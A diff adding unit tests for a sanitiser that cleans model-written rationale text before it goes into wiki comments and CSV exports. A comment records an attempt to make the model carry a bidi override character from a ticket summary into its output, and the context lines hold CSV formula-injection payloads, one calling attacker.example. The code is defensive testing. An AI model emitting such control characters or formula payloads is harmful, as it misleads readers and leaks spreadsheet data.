@@ -3624,6 +3624,34 @@ class ClampTests(unittest.TestCase):
 class SinkEscapingTests(unittest.TestCase):
     """Untrusted text reaches three sinks, not one."""
 
+    def test_invisible_and_bidi_characters_never_reach_a_comment(self):
+        # Found by fuzzing, not by an exploit: the one attempt to make the model
+        # carry U+202E from a ticket summary into its rationale did not
+        # reproduce it. wiki_safe is the backstop whose premise is that model
+        # output is untrusted, so it should hold without that attempt having
+        # been representative. An unterminated override reverses everything
+        # after it, and what follows the rationale in the same comment is the
+        # footer saying that removing the label opts the ticket out.
+        for cp in (0x202E, 0x202D, 0x200F, 0x200E, 0x200B, 0x200D, 0xFEFF, 0x2060):
+            out = run.wiki_safe(f"before{chr(cp)}after")
+            self.assertEqual(out, "beforeafter", f"U+{cp:04X} survived: {out!r}")
+
+    def test_visible_whitespace_variants_collapse_rather_than_vanish(self):
+        # The Cf strip must not swallow separators: these are spaces, and a
+        # rationale whose words ran together would be the fix causing the harm.
+        for cp in (0x00A0, 0x2028, 0x2029, 0x0085, 0x2003):
+            self.assertEqual(run.wiki_safe(f"one{chr(cp)}two"), "one two",
+                             f"U+{cp:04X} should collapse to a space")
+
+    def test_sanitising_twice_changes_nothing(self):
+        # Backslash removal used to run after the whitespace join, so a token
+        # that was only backslashes left a doubled space behind and a second
+        # pass produced different text.
+        for raw in ("a \\\\ b", "x", "[~accountid:1] and !img!", "\\\\", "  ", ""):
+            once = run.wiki_safe(raw)
+            self.assertEqual(run.wiki_safe(once), once, f"not idempotent for {raw!r}")
+        self.assertEqual(run.wiki_safe("a \\\\ b"), "a b", "no doubled space left behind")
+
     def test_formula_injection_is_defused_in_the_csv(self):
         for payload in ('=IMPORTXML("https://attacker.example/x","//a")',
                         '+1+1', '-2+3', '@SUM(A1)', '\ttab'):
